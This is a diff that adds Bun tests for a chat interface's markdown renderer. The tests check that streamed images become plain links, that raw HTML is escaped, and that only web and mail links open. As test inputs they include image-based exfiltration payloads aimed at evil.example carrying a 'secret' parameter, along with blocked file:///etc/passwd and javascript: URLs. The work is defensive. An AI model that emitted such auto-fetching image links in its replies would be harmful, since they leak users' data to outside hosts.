@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { applyEvent, compactedUpTo, splitBlocks, healTail, toolSummary, sourcesOf, splitFences, chatMarkdown, migrateMessage, newAssistant, pendingRequest, textOf, toApiMessages, toApiMessagesWithIndex, truncateAt } from "./turn.mjs";
+import { applyEvent, compactedUpTo, splitBlocks, healTail, liveMarkdown, safeLink, toolSummary, sourcesOf, splitFences, chatMarkdown, migrateMessage, newAssistant, pendingRequest, textOf, toApiMessages, toApiMessagesWithIndex, truncateAt } from "./turn.mjs";
 
 const run = (events, msg = newAssistant("hermes3:8b", 1000)) => events.reduce(applyEvent, msg);
 const started = (id, itemType, extra = {}) => Object.assign({ type: "item.started", id, itemType, title: "", input: {} }, extra);
@@ -275,5 +275,27 @@ describe("toolSummary", () => {
       .toBe("Checked prices, wrote a file and ran a command");
     expect(toolSummary([t("dynamic_tool_call", "Searching for “x”"), t("dynamic_tool_call", "Reading ~/a.qml"), t("file_change", "Editing ~/a.qml")]))
       .toBe("Read a page or file, looked through files and edited a file");
+  });
+});
+
+describe("liveMarkdown (what the streaming block may render)", () => {
+  test("an image is a link, never fetched on arrival", () => {
+    expect(liveMarkdown("see ![chart](https://evil.example/?q=secret)")).toBe("see [chart](https://evil.example/?q=secret)");
+    expect(liveMarkdown("![a][ref] and ![half](https://x")).toBe("[a][ref] and [half](https://x");
+  });
+  test("raw HTML shows as text", () => {
+    expect(liveMarkdown('hi <img src="https://evil.example/p.png"> there')).toBe('hi \\<img src="https://evil.example/p.png"> there');
+    expect(liveMarkdown("</div><!-- x -->")).toBe("\\</div>\\<!-- x -->");
+  });
+  test("inline code and ordinary text are left alone", () => {
+    expect(liveMarkdown("use `<div>` when a < b and x! [ok]")).toBe("use `<div>` when a < b and x! [ok]");
+    expect(liveMarkdown("This is **bo")).toBe("This is **bo**");
+  });
+});
+
+describe("safeLink", () => {
+  test("web and mail open; everything else does not", () => {
+    for (const ok of ["https://example.com/a", "http://x.y", "HTTPS://X.Y", "mailto:a@b.c"]) expect(safeLink(ok)).toBe(true);
+    for (const no of ["file:///etc/passwd", "smb://host/share", "javascript:alert(1)", "vscode://open", "t3code://x", "", null, " ftp://x"]) expect(safeLink(no)).toBe(false);
   });
 });
